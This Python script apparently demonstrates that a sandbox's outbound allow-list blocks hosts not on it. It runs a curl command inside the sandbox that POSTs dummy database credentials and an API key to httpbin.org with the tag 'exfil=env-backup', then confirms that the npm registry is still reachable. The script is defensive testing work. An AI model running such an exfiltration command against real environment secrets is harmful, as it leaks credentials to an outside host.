#!/usr/bin/env python3
"""Prove CubeVS blocks httpbin.org when it is not on the allow_out list."""
from __future__ import annotations

import json
import os
import sys

from cubesandbox import Sandbox

TEMPLATE = os.environ["CUBE_TEMPLATE_ID"]
os.environ.setdefault("CUBE_API_URL", os.environ.get("E2B_API_URL", "http://127.0.0.1:3000"))
os.environ.setdefault("E2B_API_URL", os.environ["CUBE_API_URL"])
os.environ.setdefault("E2B_API_KEY", "e2b_000000")

ALLOWED = [
    "registry.npmjs.org",
    "registry.yarnpkg.com",
    "nodejs.org",
    "pypi.org",
    "files.pythonhosted.org",
    "github.com",
    "objects.githubusercontent.com",
]

payload = "DATABASE_URL=postgres://demo:SuperSecret@db/app\nAPI_KEY=sk_live_demo\n"

print("Creating sandbox: allow_internet_access=False, allow_out=registries only")
print("httpbin.org is NOT on the allow list\n")
with Sandbox.create(
    template=TEMPLATE,
    allow_internet_access=False,
    network={"allow_out": ALLOWED},
) as sb:
    print("Sandbox:", sb.sandbox_id)

    r = sb.commands.run(
        "curl -sS -o /tmp/exfil.out -w '%{http_code}' --max-time 10 "
        "-X POST -H 'Content-Type: text/plain' "
        f"--data-binary {json.dumps(payload)} "
        "'https://httpbin.org/post?exfil=env-backup' || echo CURL_FAIL:$?",
        timeout=60,
    )
    print("exfil stdout:", (r.stdout or "").strip())
    print("exfil stderr:", (r.stderr or "").strip())

    r2 = sb.commands.run(
        "curl -sS -o /dev/null -w '%{http_code}' --max-time 15 "
        "https://registry.npmjs.org/ || echo CURL_FAIL:$?",
        timeout=60,
    )
    print("npm registry stdout:", (r2.stdout or "").strip())

print(
    "\nDone. Policy is recorded in Cubelet logs, e.g.:\n"
    "  sudo grep -F 'allow_out' /data/log/Cubelet/Cubelet-req.log | tail"
)
sys.exit(0)
